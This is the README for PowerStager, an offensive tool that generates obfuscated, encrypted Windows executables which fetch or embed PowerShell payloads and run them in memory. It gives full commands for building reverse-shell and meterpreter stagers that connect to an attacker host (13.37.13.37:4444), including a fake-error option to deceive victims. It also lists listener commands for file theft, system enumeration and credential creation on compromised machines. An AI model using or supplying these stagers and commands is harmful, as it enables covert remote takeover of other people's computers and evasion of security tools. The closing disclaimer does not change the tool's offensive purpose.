PowerStager: This script creates an executable stager that downloads a selected powershell payload.
===================================================================================================

Contact
-------
* Author: z0noxz
* Source: https://github.com/z0noxz/powerstager
* Email: z0noxz@mail.com

Description
-----------
This script creates an executable stager that downloads a selected powershell payload, loads it into memory and executes it using obfuscated EC methods. The script will also encrypt the stager for dynamic signatures and some additional obfuscation.

This enables the actual payload to be executed indirectly without the victim downloading it, only by executing the stager. The attacker can then for example implement evasion techniques on the web server, hosting the payload, instead of in the stager itself.

Additional methods allows the payload to be embedded into the 'stager' and temporarily stored encrypted on disk for memory injection.

Not only are powershell powerful when managing Windows, it's also powerful when exploiting Windows. This script exploits multiple Windows features such as its inherit trust of powershell, interpretation of shorthand syntaxes, code evaluation and more...

Demo
----
[![powerstager demo](https://d1ckdm8qo2u5d0.cloudfront.net/ai/videos/15651711/thumb-160x.jpg?v2r1495997991)](https://vid.me/Tfzr "powerstager demo - Click to Watch!")

How to use
----------

Prerequisites:

	python3
	python3-setuptools
	i686-w64-mingw32-gcc
	x86_64-w64-mingw32-gcc
	i686-w64-mingw32-windres
	x86_64-w64-mingw32-windres
	
Prerequisites (python3 modules):

	os
	sys
	getopt
	glob
	socket
	fcntl
	errno
	string
	re
	random
	base64
	datetime
	time
	hashlib
	readline
	signal
	urllib
	names

Install it:

	git clone https://github.com/z0noxz/powerstager
	cd powerstager
	sudo ./setup.py install

Generate a reverse shell payload to upload:

	powerstager --target win64 \
	--reverse-shell \
	--lhost 13.37.13.37 \
	--lport 4444 \
	--generate \
	--output out.ps1
	
	powerstager --target win64 \
	--url <url pointing the the uploaded payload> \
	--output out.exe

Generate an embedded reverse shell payload, with obfuscation and fake-error:

	powerstager --target win64 \
	--reverse-shell \
	--lhost 13.37.13.37 \
	--lport 4444 \
	--obfuscation \
	--fake-error \
	--output out.exe

Generate a meterpreter payload to upload:

	powerstager --target win64 \
	--meterpreter \
	--lhost 13.37.13.37 \
	--lport 4444 \
	--generate \
	--output out.ps1
	
	powerstager --target win64 \
	--url <url pointing the the uploaded payload> \
	--output out.exe

Generate an embedded meterpreter payload, with obfuscation and fake-error:

	powerstager --target win64 \
	--meterpreter \
	--lhost 13.37.13.37 \
	--lport 4444 \
	--obfuscation \
	--fake-error \
	--output out.exe

Generate an embedded custom payload:

	powerstager --target win64 \
	--path input.ps1
	--output out.exe

Open a reverse shell listener:

	powerstager --listener \
	--lport 4444

Reverse shell listener commands:
* Local-Invoke
  *Invokes powershell script files from host*

* Local-Import-Module
  *Imports powershell modules from host*

* Local-Set-Width
  *Changes the buffer width on remote client*

* Local-Upload
  *Uploads files from host*

* Local-Download
  *Downloads files from client*

* Local-Download-Commands
  *Downloads available powershell commands from client*

* Local-Enumerate-System
  *Runs enumeration scripts on client*

* Local-Check-Status
  *Collects user and privilage status from client*

* Local-Spawn-Meterpreter
  *Spawns meterpreter shells on client*

* Local-Spawn-Reverse-Shell
  *Spawns reverse shells on client*

* Local-Credential-Create
  *Creates credentials on client*

* Local-Credential-List
  *Lists created credentials on client*


## DISCLAIMER:
You shall not misuse this tool to gain unauthorized access. This tool should only be used to expand knowledge, and not for causing malicious or damaging attacks. Performing any attacks without written permission from the owner of the system is illegal.
